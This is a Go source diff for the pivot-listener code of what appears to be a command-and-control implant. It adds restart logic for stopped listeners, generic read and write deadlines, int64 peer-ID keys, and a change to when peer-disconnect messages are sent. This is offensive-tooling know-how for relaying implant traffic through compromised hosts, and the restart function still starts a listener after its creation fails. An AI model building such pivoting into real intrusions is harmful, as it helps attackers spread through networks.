@@ -48,11 +48,16 @@ var (
 	// ErrFailedKeyExchange - Failed to exchange session and/or peer keys
 	ErrFailedKeyExchange = errors.New("failed key exchange")
 
-	pivotListeners = &sync.Map{}
-	listenerID     = uint32(0)
+	pivotListeners        = &sync.Map{}
+	stoppedPivotListeners = &sync.Map{}
+
+	listenerID = uint32(0)
 
 	// MyPeerID - This implant's Peer ID, a per-execution instance ID
 	MyPeerID = generatePeerID()
+
+	pivotReadDeadline  = 10 * time.Second
+	pivotWriteDeadline = 10 * time.Second
 )
 
 // generatePeerID - Generate a new pivot id
@@ -99,12 +104,23 @@ func RemoveListener(id uint32) {
 	}
 }
 
-// StartAllListeners - Start all pivot listeners
-func StartAllListeners() {
-	pivotListeners.Range(func(key, value interface{}) bool {
-		value.(*PivotListener).Start()
+// RestartAllListeners - Start all pivot listeners
+func RestartAllListeners(send chan<- *pb.Envelope) {
+	stoppedPivotListeners.Range(func(key, value interface{}) bool {
+		stoppedListener := value.(*PivotListener)
+		if createListener, ok := SupportedPivotListeners[stoppedListener.Type]; ok {
+			listener, err := createListener(stoppedListener.BindAddress, send)
+			if err != nil {
+				// {{if .Config.Debug}}
+				log.Printf("[pivot] failed to restart listener: %s", err)
+				// {{end}}
+			}
+			go listener.Start()
+			AddListener(listener)
+		}
 		return true
 	})
+	stoppedPivotListeners = nil
 }
 
 // StopAllListeners - Stop all pivot listeners
@@ -113,6 +129,8 @@ func StopAllListeners() {
 		value.(*PivotListener).Stop()
 		return true
 	})
+	stoppedPivotListeners = pivotListeners
+	pivotListeners = &sync.Map{}
 }
 
 // StartListener - Stop a pivot listener
@@ -189,7 +207,7 @@ type PivotListener struct {
 	ID               uint32
 	Type             pb.PivotType
 	Listener         net.Listener
-	PivotConnections *sync.Map // ID -> NetConnPivot
+	PivotConnections *sync.Map // PeerID (int64) -> NetConnPivot
 	BindAddress      string
 	Upstream         chan<- *pb.Envelope
 }
@@ -225,8 +243,8 @@ func (p *PivotListener) Start() {
 			conn:          conn,
 			readMutex:     &sync.Mutex{},
 			writeMutex:    &sync.Mutex{},
-			readDeadline:  tcpPivotReadDeadline,
-			writeDeadline: tcpPivotWriteDeadline,
+			readDeadline:  pivotReadDeadline,
+			writeDeadline: pivotWriteDeadline,
 			upstream:      p.Upstream,
 			Downstream:    make(chan *pb.Envelope),
 		}
@@ -239,9 +257,9 @@ func (l *PivotListener) Stop() {
 	l.Listener.Close() // Stop accepting new connections
 
 	// Close all existing connections
-	connectionIDs := []uint32{}
+	connectionIDs := []int64{}
 	l.PivotConnections.Range(func(key interface{}, value interface{}) bool {
-		connectionIDs = append(connectionIDs, value.(uint32))
+		connectionIDs = append(connectionIDs, key.(int64))
 		return true
 	})
 	for _, id := range connectionIDs {
@@ -290,15 +308,6 @@ func (p *NetConnPivot) ToProtobuf() *pb.NetConnPivot {
 func (p *NetConnPivot) Start(pivots *sync.Map) {
 	defer func() {
 		p.conn.Close()
-		if p.downstreamPeerID != 0 {
-			p.upstream <- &pb.Envelope{
-				Type: pb.MsgPivotPeerFailure,
-				Data: mustMarshal(&pb.PivotPeerFailure{
-					Type:   pb.PeerFailureType_DISCONNECT,
-					PeerID: p.downstreamPeerID,
-				}),
-			}
-		}
 	}()
 	err := p.peerKeyExchange()
 	if err != nil {
@@ -359,6 +368,15 @@ func (p *NetConnPivot) Start(pivots *sync.Map) {
 	for envelope := range p.Downstream {
 		err := p.writeEnvelope(envelope)
 		if err != nil {
+			if p.downstreamPeerID != 0 {
+				p.upstream <- &pb.Envelope{
+					Type: pb.MsgPivotPeerFailure,
+					Data: mustMarshal(&pb.PivotPeerFailure{
+						Type:   pb.PeerFailureType_DISCONNECT,
+						PeerID: p.downstreamPeerID,
+					}),
+				}
+			}
 			return
 		}
 	}
